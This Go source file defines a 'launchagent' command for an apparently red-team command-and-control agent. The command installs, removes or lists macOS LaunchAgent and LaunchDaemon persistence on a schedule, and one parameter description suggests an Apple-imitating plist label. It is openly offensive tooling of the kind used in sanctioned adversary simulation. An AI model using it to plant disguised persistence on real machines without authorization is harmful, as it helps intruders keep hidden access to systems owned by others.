package agentfunctions

import (
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "launchagent",
		Description:         "Install, remove, or list macOS LaunchAgent/LaunchDaemon persistence",
		HelpString:          "launchagent -action <install|remove|list> -label <com.example.name> [-path <exe>] [-daemon true] [-interval <seconds>] [-run_at <HH:MM>]",
		Version:             1,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1543.004"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"install", "remove", "list"},
				Description:      "install: create plist, remove: delete plist, list: enumerate persistence",
				DefaultValue:     "install",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "label",
				ModalDisplayName: "Label",
				CLIName:          "label",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Reverse-DNS label for the plist (e.g., com.apple.security.updater). This becomes the filename.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "path",
				ModalDisplayName: "Executable Path",
				CLIName:          "path",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Path to the executable. Defaults to the agent binary.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "args",
				ModalDisplayName: "Arguments",
				CLIName:          "args",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Optional arguments for the executable.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "daemon",
				ModalDisplayName: "LaunchDaemon (root)",
				CLIName:          "daemon",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:      "Use LaunchDaemon (system-wide, requires root) instead of LaunchAgent (user-level)",
				DefaultValue:     false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "interval",
				ModalDisplayName: "Start Interval (seconds)",
				CLIName:          "interval",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Optional: restart interval in seconds (e.g., 3600 = every hour). Plist always has RunAtLoad+KeepAlive.",
				DefaultValue:     0,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "run_at",
				ModalDisplayName: "Run At (Calendar)",
				CLIName:          "run_at",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Optional: calendar schedule. Format: 'HH:MM' (daily) or 'weekday HH:MM' (0=Sun, 1=Mon, etc.)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		AssociatedBrowserScript: nil,
		TaskFunctionOPSECPre:    nil,
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := fmt.Sprintf("%s", action)
			response.DisplayParams = &display
			if action == "install" {
				label, _ := taskData.Args.GetStringArg("label")
				path, _ := taskData.Args.GetStringArg("path")
				createArtifact(taskData.Task.ID, "File Write", fmt.Sprintf("LaunchAgent plist creation: %s.plist (program=%s)", label, path))
			} else if action == "remove" {
				label, _ := taskData.Args.GetStringArg("label")
				createArtifact(taskData.Task.ID, "File Delete", fmt.Sprintf("LaunchAgent plist removal: %s.plist", label))
			}
			return response
		},
		TaskFunctionProcessResponse: nil,
	})
}
